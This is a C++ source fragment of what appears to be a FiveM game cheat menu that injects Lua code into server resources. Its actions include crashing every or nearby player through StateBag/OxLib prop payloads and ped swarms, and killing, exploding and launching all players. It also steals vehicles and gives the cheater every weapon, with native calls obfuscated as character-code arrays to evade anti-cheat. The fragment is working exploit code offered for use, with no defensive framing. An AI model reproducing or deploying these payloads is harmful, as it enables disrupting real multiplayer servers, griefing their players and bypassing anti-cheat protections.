                    "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                    "WEAPON_TACTICALRIFLE",
                    -- LMGs
                    "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                    -- Shotguns
                    "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN",
                    "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET",
                    "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN",
                    "WEAPON_COMBATSHOTGUN",
                    -- Sniper Rifles
                    "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2",
                    "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2", "WEAPON_PRECISIONRIFLE",
                    -- Heavy
                    "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE",
                    "WEAPON_MINIGUN", "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER",
                    "WEAPON_COMPACTLAUNCHER", "WEAPON_RAYMINIGUN",
                    -- Throwables
                    "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_SMOKEGRENADE", "WEAPON_BZGAS",
                    "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL",
                    "WEAPON_FLARE", "WEAPON_BALL", "WEAPON_PROXIMITYMINE", "WEAPON_PIPEBOMB",
                    "WEAPON_ACIDPACKAGE",
                    -- Misc
                    "WEAPON_PARACHUTE"
                }
                for _, weapon in ipairs(weapons) do
                    _g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(ped, _g({71,101,116,72,97,115,104,75,101,121})(weapon), 999, false, true)
                end
            )lua";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void ExecuteExploitAction(const std::string& actionName, int count = 1) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            std::string code;

            if (actionName == "Ban All Players") {
                code = R"lua(
                    local function SafeWrap(setFunc)
                        return function(...)
                            return setFunc(...)
                        end
                    end

                    local SafeThread = SafeWrap(CreateThread)
                    local SafeCVehicle = SafeWrap(CreateVehicle)

                    SafeThread(function()
                        local vehicleModel = GetHashKey("mule")
                        RequestModel(vehicleModel)
                        while not HasModelLoaded(vehicleModel) do
                            Wait(10)
                        end

                        local myPed = PlayerPedId()
                        local playerList = GetActivePlayers()
                        for _, playerId in ipairs(playerList) do
                            local ped = GetPlayerPed(playerId)
                            if ped ~= myPed and DoesEntityExist(ped) then
                                if not IsPedInAnyVehicle(ped, false) then
                                    local targetCoords = GetEntityCoords(ped)
                                    local veh = SafeCVehicle(vehicleModel, targetCoords.x, targetCoords.y + 3.0, targetCoords.z, 0.0, true, true, false)
                                    if DoesEntityExist(veh) then
                                        SetEntityVisible(veh, false, false)
                                        SetEntityCoords(veh, targetCoords.x, targetCoords.y, targetCoords.z + 2.0, true, true, true, true)
                                        SetEntityVisible(veh, false, false)
                                        SetEntityAsMissionEntity(veh, true, true)
                                        SetEntityDynamic(veh)
                                        SetEntityCollision(veh, true, true)
                                        ActivatePhysics(veh)

                                        SafeThread(function()
                                            Wait(2000)
                                            if DoesEntityExist(veh) then
                                                NetworkRequestControlOfEntity(veh)
                                                ApplyForceToEntity(
                                                    veh,
                                                    1,
                                                    150000.0,
                                                    0.0,
                                                    350000000.0,
                                                    0.0,
                                                    0.0,
                                                    0.0,
                                                    0,
                                                    true,
                                                    true,
                                                    true,
                                                    false,
                                                    true
                                                )
                                                Wait(6000)
                                                if DoesEntityExist(veh) then
                                                    DeleteEntity(veh)
                                                end
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end)
                )lua";
            }
            else if (actionName == "Crash All Players (StateBag)") {
                code = R"lua(
                    for i = 1, 100 do
                        RemoveStateBagChangeHandler(i)
                    end
                    Wait(100)
                    local haha = {
                        ['pos'] = 'vec3(0.000000, 0.000000, 0.000000)',
                        ['rot'] = 'vec3(0.000000, 0.000000, 0.000000)',
                        ['model'] = "p_spinning_anus_s",
                        ['bone'] = 0
                    }
                    local haha2 = {}
                    for i = 1, 600 do
                        haha2[i] = haha
                    end
                    local payload = msgpack.pack(haha2)
                    local myPlayerId = PlayerId()
                    for _, playerId in ipairs(GetActivePlayers()) do
                        if playerId ~= myPlayerId then
                            local targetSid = GetPlayerServerId(playerId)
                            SetStateBagValue("player:" .. targetSid, "lib:progressProps", payload, #payload, true)
                        end
                    end
                )lua";
            }
            else if (actionName == "Crash All Players (OxLib)") {
                code = R"lua(
                    local props = {}
                    for i = 1, 600 do
                        props[i] = {
                            model = 'p_spinning_anus_s',
                            coords = vec3(0.0, 0.0, 0.0),
                            pos = vec3(0.0, 0.0, 0.0),
                            rot = vec3(0.0, 0.0, 0.0)
                        }
                    end
                    local plyState = LocalPlayer.state
                    plyState:set('lib:progressProps', props, true)
                    Wait(1000)
                    plyState:set('lib:progressProps', nil, true)
                )lua";
            }
            else if (actionName == "Crash All Players (Ped)") {
                code = R"lua(
                    local pedModel = GetHashKey("cs_wade")
                    RequestModel(pedModel)
                    while not HasModelLoaded(pedModel) do
                        Citizen.Wait(10)
                    end
                    local spawnedPeds = {}
                    local maxPedsPerBatch = 5
                    local maxIterations = 22
                    local myPlayerId = PlayerId()
                    for i = 0, maxIterations - 1 do
                        for _, playerId in ipairs(GetActivePlayers()) do
                            if playerId ~= myPlayerId then
                                local targetPed = GetPlayerPed(playerId)
                                if DoesEntityExist(targetPed) then
                                    local coords = GetEntityCoords(targetPed)
                                    if coords then
                                        for j = 1, maxPedsPerBatch do
                                            local ped = CreatePed(28, pedModel, coords.x, coords.y, coords.z, 0.0, true, false)
                                            if DoesEntityExist(ped) then
                                                SetEntityAlpha(ped, 0, false)
                                                SetEntityVisible(ped, false, false)
                                                AttachEntityToEntity(ped, targetPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, true, 2, true)
                                                FreezeEntityPosition(ped, true)
                                                SetEntityCompletelyDisableCollision(ped, false, false)
                                                SetEntityCollision(ped, false, false)
                                                SetPedConfigFlag(ped, 292, true)
                                                SetPedConfigFlag(ped, 301, true)
                                                SetPedConfigFlag(ped, 128, true)
                                                SetPedConfigFlag(ped, 287, true)
                                                SetEntityCanBeDamaged(ped, false)
                                                SetEntityInvincible(ped, true)
                                                SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                                                SetPedCanRagdoll(ped, false)
                                                SetPedCanRagdollFromPlayerImpact(ped, false)
                                                SetBlockingOfNonTemporaryEvents(ped, true)
                                                table.insert(spawnedPeds, ped)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                        Citizen.Wait(100)
                    end
                    SetModelAsNoLongerNeeded(pedModel)
                    Citizen.CreateThread(function()
                        Citizen.Wait(3000)
                        for _, ped in ipairs(spawnedPeds) do
                            if DoesEntityExist(ped) then
                                DeleteEntity(ped)
                                if DoesEntityExist(ped) then DeletePed(ped) end
                            end
                        end
                    end)
                )lua";
            }
            else if (actionName == "Kill All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if normalKillEveryoneEnabled == nil then normalKillEveryoneEnabled = false end
                    normalKillEveryoneEnabled = true

                    local function StartKillingEveryone()
                        local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                        local weaponHash = _g({71,101,116,72,97,115,104,75,101,121})("VEHICLE_WEAPON_PLAYER_BULLET")
                        local delay = 100
                        local damage = 1000.0
                        local maxDistance = 300.0

                        local createThread = _g({67,114,101,97,116,101,84,104,114,101,97,100})
                        local shootBullet = _g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})

                        createThread(function()
                            while normalKillEveryoneEnabled and not Unloaded do
                                _g({87,97,105,116})(delay)
                                local activePlayers = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
                                local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)

                                for _, playerId in ipairs(activePlayers) do
                                    local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                                    if targetPed ~= myPed and _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) and not _g({73,115,80,101,100,68,101,97,100,79,114,68,121,105,110,103})(targetPed, true) then
                                        local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                        if #(targetCoords - myCoords) <= maxDistance then
                                            local startCoords = vector3(
                                                targetCoords.x + (math.random() - 0.5) * 0.8,
                                                targetCoords.y + (math.random() - 0.5) * 0.8,
                                                targetCoords.z + 1.2
                                            )

                                            local endCoords = vector3(
                                                targetCoords.x,
                                                targetCoords.y,
                                                targetCoords.z + 0.2
                                            )

                                            shootBullet(
                                                startCoords.x, startCoords.y, startCoords.z,
                                                endCoords.x, endCoords.y, endCoords.z,
                                                damage,
                                                true,
                                                weaponHash,
                                                myPed,
                                                true,
                                                false,
                                                100.0
                                            )
                                        end
                                    end
                                end
                            end
                        end)
                    end
                    StartKillingEveryone()
                )lua";
            }
            else if (actionName == "Ragdoll All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()

                    for _, playerId in ipairs(players) do
                        if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                                local targetCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)
                                local dist = #(myCoords - targetCoords)
                                if dist < 50.0 then
                                    _g({83,101,116,80,101,100,84,111,82,97,103,100,111,108,108})(targetPed, 5000, 5000, 0, false, false, false)
                                end
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Explode All Players") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n, hash)
                        local name = _d(n)
                        return _ENV[name] or _G[name] or function(...) return Citizen.InvokeNative(hash or GetHashKey(name), ...) end
                    end
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then
                        _hook("CreateThread", function(o, ...) return o(...) end)
                    end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100}, 0x438E35C4C338A1A9)()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115}, 0x3FE3FBDD91D0E790)(myPed)
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115}, 0xCF1CE768F2332BE1)()
                    local _PlayerId = _g({80,108,97,121,101,114,73,100}, 0x4F0503D1A5C59132)
                    local _GetPlayerPed = _g({71,101,116,80,108,97,121,101,114,80,101,100}, 0x43DBED0170AEC239)
                    local _DoesEntityExist = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116}, 0x72449E489A4CE00F)
                    local _GetEntityCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115}, 0x3FE3FBDD91D0E790)
                    local _RequestModel = _g({82,101,113,117,101,115,116,77,111,100,101,108}, 0x963D27A58DF86C11)
                    local _RequestWeaponAsset = _g({82,101,113,117,101,115,116,87,101,97,112,111,110,65,115,115,101,116}, 0x5443438F03596C5D)
                    local _HasModelLoaded = _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100}, 0x98A4EB5D89A0C952)
                    local _HasWeaponAssetLoaded = _g({72,97,115,87,101,97,112,111,110,65,115,115,101,116,76,111,97,100,101,100}, 0x36585AE6640C1A6E)
                    local _CreatePed = _g({67,114,101,97,116,101,80,101,100}, 0xD49F9B09F8319177)
                    local _SetEntityInvincible = _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101}, 0x38821C45DE6590EF)
                    local _FreezeEntityPosition = _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110}, 0x428A3C376485C266)
                    local _SetEntityVisible = _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101}, 0xEA1C610A04DB6B5B)
                    local _GiveWeaponToPed = _g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100}, 0xBF0FD6E56C96CAEF)
                    local _SetCurrentPedWeapon = _g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110}, 0xAD2739C20CC7B375)
                    local _TaskShootAtCoord = _g({84,97,115,107,83,104,111,111,116,65,116,67,111,111,114,100}, 0x860431500F9A38CE)
                    local _SetEntityAsMissionEntity = _g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,101,116,105,111,110,69,110,116,105,116,121}, 0xAD738C3085FE7CA4)
                    local _DeleteEntity = _g({68,101,108,101,116,101,69,110,116,105,116,121}, 0xAE3CBE590B5C92A4)

                    for _, playerId in ipairs(players) do
                        if playerId ~= _PlayerId() then
                            local targetPed = _GetPlayerPed(playerId)
                            if _DoesEntityExist(targetPed) then
                                local targetCoords = _GetEntityCoords(targetPed)
                                local dist = #(myCoords - targetCoords)
                                if dist < 2500.0 then
                                    Citizen.CreateThread(function()
                                        local m = _g({71,101,116,72,97,115,104,75,101,121})('mp_m_freemode_01')
                                        local w = _g({71,101,116,72,97,115,104,75,101,121})('WEAPON_HOMINGLAUNCHER')
                                        _RequestModel(m)
                                        _RequestWeaponAsset(w, 31, 0)
                                        while not _HasModelLoaded(m) or not _HasWeaponAssetLoaded(w) do
                                            Citizen.Wait(0)
                                        end
                                        local n = _CreatePed(4, m, targetCoords.x, targetCoords.y, targetCoords.z, 0.0, true, false)
                                        if _DoesEntityExist(n) then
                                            _SetEntityInvincible(n, true)
                                            _FreezeEntityPosition(n, true)
                                            _SetEntityVisible(n, false, false)
                                            _GiveWeaponToPed(n, w, 999, false, true)
                                            _SetCurrentPedWeapon(n, w, true)
                                            _TaskShootAtCoord(n, targetCoords.x, targetCoords.y, targetCoords.z - 2.0, 5000, w)
                                            Citizen.SetTimeout(500, function()
                                                if _DoesEntityExist(n) then
                                                    _SetEntityAsMissionEntity(n, true, true)
                                                    _DeleteEntity(n)
                                                end
                                            end)
                                        end
                                    end)
                                end
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Explode All Vehicles") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local myCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(myPed)
                    local vehicles = _g({71,101,116,71,97,109,101,80,111,111,108})('CVehicle')

                    for _, vehicle in ipairs(vehicles) do
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(vehicle) then
                            local vehCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(vehicle)
                            local dist = #(myCoords - vehCoords)
                            if dist < 2500.0 then
                                _g({78,101,116,119,111,114,107,69,120,112,108,111,100,101,86,101,104,105,99,108,101})(vehicle, true, false, false)
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Launch All Players") {
                code = R"lua(
                    local function SafeWrap(setFunc)
                        return function(...)
                            return setFunc(...)
                        end
                    end

                    local SafeThread = SafeWrap(CreateThread)
                    local SafeCVehicle = SafeWrap(CreateVehicle)

                    SafeThread(function()
                        local vehicleHash = GetHashKey("mule2")
                        RequestModel(vehicleHash)
                        while not HasModelLoaded(vehicleHash) do
                            Wait(10)
                        end

                        local myPed = PlayerPedId()
                        local players = GetActivePlayers()
                        for _, playerId in ipairs(players) do
                            if playerId ~= PlayerId() then
                                local targetPed = GetPlayerPed(playerId)
                                if DoesEntityExist(targetPed) then
                                    if not IsPedInAnyVehicle(targetPed, false) then
                                        local coords = GetEntityCoords(targetPed)
                                        local veh = SafeCVehicle(vehicleHash, coords.x, coords.y, coords.z, 50.0, true, true, false)
                                        if DoesEntityExist(veh) then
                                            SetEntityVisible(veh, false, false)
                                            SetEntityRotation(veh, 270.0, 0.0, 0.0, 2, true)
                                            SetEntityCoordsNoOffset(veh, coords.x, coords.y, coords.z - 2.0, false, false, false)

                                            SetEntityVelocity(veh, 0.0, 0.0, 5.0)
                                            local targetHeight = coords.z + 3000.0
                                            
                                            SafeThread(function()
                                                local loopStart = GetGameTimer()
                                                while DoesEntityExist(veh) and GetGameTimer() - loopStart < 30000 do
                                                    local vehCoords = GetEntityCoords(veh)
                                                    if vehCoords.z >= targetHeight then break end

                                                    SetEntityRotation(veh, 270.0, 0.0, 0.0, 2, true)
                                                    SetEntityVelocity(veh, 0.0, 0.0, 12.0)
                                                    Wait(30)
                                                end
                                                Wait(1000)
                                                if DoesEntityExist(veh) then
                                                    DeleteEntity(veh)
                                                end
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    end)
                )lua";
            }
            else if (actionName == "Launch All Vehicles") {
                code = R"lua(
                    local function SafeWrap(setFunc)
                        return function(...)
                            return setFunc(...)
                        end
                    end

                    local SafeThread = SafeWrap(CreateThread)

                    SafeThread(function()
                        local myPed = PlayerPedId()
                        local myCoords = GetEntityCoords(myPed)
                        local originalCoords = GetEntityCoords(myPed)
                        local vehicles = GetGamePool('CVehicle')

                        for _, vehicle in ipairs(vehicles) do
                            if DoesEntityExist(vehicle) then
                                local vehCoords = GetEntityCoords(vehicle)
                                local dist = #(myCoords - vehCoords)
                                if dist < 500.0 then
                                    SetPedIntoVehicle(myPed, vehicle, 0)
                                    Wait(100)

                                    NetworkRequestControlOfEntity(vehicle)
                                    local reqTimeout = 2000
                                    while not NetworkHasControlOfEntity(vehicle) and reqTimeout > 0 do
                                        NetworkRequestControlOfEntity(vehicle)
                                        Wait(10)
                                        reqTimeout = reqTimeout - 10
                                    end

                                    SafeThread(function()
                                        local forceUp = 500.0
                                        while DoesEntityExist(vehicle) do
                                            NetworkRequestControlOfEntity(vehicle)
                                            SetEntityCollision(vehicle, false, true)
                                            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, forceUp, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                            Wait(50)
                                        end
                                    end)

                                    Wait(100)
                                end
                            end
                        end

                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                    end)
                )lua";
            }
            else if (actionName == "Steal All Vehicles") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                    local players = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()

                    for _, playerId in ipairs(players) do
                        if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                            local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                            if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) and _g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})(targetPed, false) then
                                local vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(targetPed)
                                if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(vehicle) then
                                    local driver = _g({71,101,116,80,101,100,73,110,86,101,104,105,99,108,101,83,101,97,116})(vehicle, -1)
                                    if driver ~= 0 and _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(driver) then
                                        _g({78,101,116,119,111,114,107,82,101,113,117,101,115,116,67,111,110,116,114,111,108,79,102,69,110,116,105,116,121})(vehicle)
                                        _g({67,108,101,97,114,80,101,100,84,97,115,107,115,73,109,109,101,100,105,97,116,101,108,121})(driver)
                                    end
                                    _g({84,97,115,107,69,110,116,101,114,86,101,104,105,99,108,101})(myPed, vehicle, 1200, -1, 2.0, 16, 0)
                                end
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Kick All Players From Vehicle") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local _hook = _G[_d({77,97,99,104,111,77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then
                        _hook(_d({67,114,101,97,116,101,84,104,114,101,97,100}), function(o, ...) return o(...) end)
                        _hook(_d({87,97,105,116}), function(o, ...) return o(...) end)
                        _hook(_d({71,101,116,80,108,97,121,101,114,80,101,100}), function(o, ...) return o(...) end)
                        _hook(_d({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110}), function(o, ...) return o(...) end)
                        _hook(_d({83,101,116,86,101,104,105,99,108,101,69,120,99,108,117,115,105,118,101,68,114,105,118,101,114,95,50}), function(o, ...) return o(...) end)
                        _hook(_d({80,108,97,121,101,114,80,101,100,73,100}), function(o, ...) return o(...) end)
                        _hook(_d({83,101,116,80,101,100,73,110,116,111,86,101,104,105,99,108,101}), function(o, ...) return o(...) end)
                    end

                    local _citizen = _G[_d({67,105,116,105,122,101,110})]
                    _citizen[_d({67,114,101,97,116,101,84,104,114,101,97,100})](function()
                        local allPlayers = _g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
                        for _, playerId in ipairs(allPlayers) do
                            if playerId ~= _g({80,108,97,121,101,114,73,100})() then
                                local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(playerId)
                                if targetPed and targetPed ~= 0 then
                                    local vehicle = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(targetPed, false)
                                    if vehicle ~= 0 then
                                        _citizen[_d({87,97,105,116})](100)
                                        _g({83,101,116,86,101,104,105,99,108,101,69,120,99,108,117,115,105,118,101,68,114,105,118,101,114,95,50})(vehicle, _g({80,108,97,121,101,114,80,101,100,73,100})(), 1)
                                        _g({83,101,116,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(_g({80,108,97,121,101,114,80,101,100,73,100})(), vehicle, -1)
                                        _citizen[_d({87,97,105,116})](100)
                                        _g({83,101,116,86,101,104,105,99,108,101,69,120,99,108,117,115,105,118,101,68,114,105,118,101,114,95,50})(vehicle, 0, 0)
                                    end
                                end
                                _citizen[_d({87,97,105,116})](800)
                            end
                        end
                    end)
                )lua";
            }
            else if (actionName == "Crash Nearby Players (StateBag)") {
                code = R"lua(
                    for i = 1, 100 do
                        RemoveStateBagChangeHandler(i)
                    end
                    Wait(100)
                    local haha = {
                        ['pos'] = 'vec3(0.000000, 0.000000, 0.000000)',
                        ['rot'] = 'vec3(0.000000, 0.000000, 0.000000)',
                        ['model'] = "p_spinning_anus_s",
                        ['bone'] = 0
                    }
                    local haha2 = {}
                    for i = 1, 600 do
                        haha2[i] = haha
                    end
                    local payload = msgpack.pack(haha2)
                    local myPed = PlayerPedId()
                    local myCoords = GetEntityCoords(myPed)
                    for _, playerId in ipairs(GetActivePlayers()) do
                        if playerId ~= PlayerId() then
                            local ped = GetPlayerPed(playerId)
                            if ped and DoesEntityExist(ped) then
                                local targetCoords = GetEntityCoords(ped)
                                if #(targetCoords - myCoords) < 150.0 then
                                    local targetSid = GetPlayerServerId(playerId)
                                    SetStateBagValue("player:" .. targetSid, "lib:progressProps", payload, #payload, true)
                                end
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Crash Nearby Players (OxLib)") {
                code = R"lua(
                    local props = {}
                    for i = 1, 600 do
                        props[i] = {
                            model = 'p_spinning_anus_s',
                            coords = vec3(0.0, 0.0, 0.0),
                            pos = vec3(0.0, 0.0, 0.0),
                            rot = vec3(0.0, 0.0, 0.0)
                        }
                    end
                    local plyState = LocalPlayer.state
                    plyState:set('lib:progressProps', props, true)
                    Wait(1000)
                    plyState:set('lib:progressProps', nil, true)
                )lua";
            }
            else if (actionName == "Crash Nearby Players (Ped)") {
                code = R"lua(
local isSpawning = false 
local hasRun = false 

function GetClosestPlayer()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local closestPlayer = -1
    local closestDistance = math.huge

    for _, playerId in ipairs(GetActivePlayers()) do
        if playerId ~= PlayerId() then
            local targetPed = GetPlayerPed(playerId)
            if DoesEntityExist(targetPed) and NetworkIsPlayerActive(playerId) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(playerCoords - targetCoords)
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = playerId
                end
            end
        end
    end

    return closestPlayer
end

function ForceDeleteAllPeds(spawnedPeds, pedModel)
    for _, ped in ipairs(spawnedPeds) do
        if DoesEntityExist(ped) then
            SetEntityAsMissionEntity(ped, true, true)
            
            local timeout = 0
            while not NetworkHasControlOfEntity(ped) and timeout < 30 do
                NetworkRequestControlOfEntity(ped)
                Citizen.Wait(10)
                timeout = timeout + 1
            end
            
            DeleteEntity(ped)
            if DoesEntityExist(ped) then
                DeletePed(ped)
            end
        end
    end
    if pedModel then
        SetModelAsNoLongerNeeded(pedModel)
    end
end

function SpawnPedsAtPlayer2()
    if isSpawning or hasRun then return end
    isSpawning = true
    hasRun = true

    local playerPed = PlayerPedId()
    local selectedPlayer = GetClosestPlayer()

    if selectedPlayer == -1 then
        isSpawning = false
        hasRun = false
        print("[South] No target found!")
        return
    end

    local targetPed = GetPlayerPed(selectedPlayer)
    local targetName = GetPlayerName(selectedPlayer)

    if DoesEntityExist(targetPed) and targetPed ~= playerPed and NetworkIsPlayerActive(selectedPlayer) then
        local pedModel = GetHashKey("mp_m_freemode_01")
        RequestModel(pedModel)
        while not HasModelLoaded(pedModel) do
            Citizen.Wait(100)
        end

        local spawnedPeds = {}
        local maxPedsPerBatch = 5
        local maxIterations = 22

        for i = 0, maxIterations - 1 do
            targetPed = GetPlayerPed(selectedPlayer)
            if not DoesEntityExist(targetPed) or not NetworkIsPlayerActive(selectedPlayer) then
                ForceDeleteAllPeds(spawnedPeds, pedModel)
                break
            end

            local coords = GetEntityCoords(targetPed)
            if not coords then
                ForceDeleteAllPeds(spawnedPeds, pedModel)
                break
            end

            for j = 1, maxPedsPerBatch do
                local ped = CreatePed(28, pedModel, coords.x, coords.y, coords.z, 0.0, true, false)
                if DoesEntityExist(ped) then
                    SetEntityAlpha(ped, 0, false)
                    SetEntityVisible(ped, false, false)
                    AttachEntityToEntity(ped, targetPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, true, 2, true)
                    FreezeEntityPosition(ped, true)
                    SetEntityCompletelyDisableCollision(ped, false, false)
                    SetEntityCollision(ped, false, false)
                    SetEntityNoCollisionEntity(ped, playerPed, true)
                    SetEntityNoCollisionEntity(playerPed, ped, true)
                    SetEntityNoCollisionEntity(ped, ped, true)
                    SetPedConfigFlag(ped, 292, true)
                    SetPedConfigFlag(ped, 301, true)
                    SetPedConfigFlag(ped, 128, true)
                    SetPedConfigFlag(ped, 287, true)
                    SetEntityCanBeDamaged(ped, false)
                    SetEntityInvincible(ped, true)
                    SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                    SetPedCanRagdoll(ped, false)
                    SetPedCanRagdollFromPlayerImpact(ped, false)
                    SetPedConfigFlag(ped, 17, true)
                    SetPedConfigFlag(ped, 297, true)
                    SetPedConfigFlag(ped, 281, true)
                    SetPedConfigFlag(ped, 435, true)
                    SetPedConfigFlag(ped, 430, true)
                    SetPedConfigFlag(ped, 223, true)
                    SetPedConfigFlag(ped, 229, true)
                    SetPedConfigFlag(ped, 149, true)
                    SetBlockingOfNonTemporaryEvents(ped, true)
                    SetPedFleeAttributes(ped, 0, false)
                    SetPedCombatAttributes(ped, 46, false)
                    SetPedCombatAttributes(ped, 5, false)
                    SetPedCombatAttributes(ped, 17, false)
                    SetPedCombatAttributes(ped, 0, false)
                    SetPedCombatAbility(ped, 0)
                    SetPedCombatRange(ped, 0)
                    SetPedCombatMovement(ped, 0)
                    SetPedAsEnemy(ped, false)
                    DisablePedPainAudio(ped, true)
                    SetPedMute(ped, true)
                    SetAudioFlag("DisablePedSpeech", true)
                    StopPedSpeaking(ped, true)
                    SetPedSeeingRange(ped, 0.0)
                    SetPedHearingRange(ped, 0.0)
                    SetPedAlertness(ped, 0)
                    SetPedAsNoLongerNeeded(ped)
                    table.insert(spawnedPeds, ped)
                end
            end
            Citizen.Wait(250)
        end
        SetModelAsNoLongerNeeded(pedModel)

        Citizen.CreateThread(function()
            Citizen.Wait(3000)
            ForceDeleteAllPeds(spawnedPeds, pedModel)
            isSpawning = false
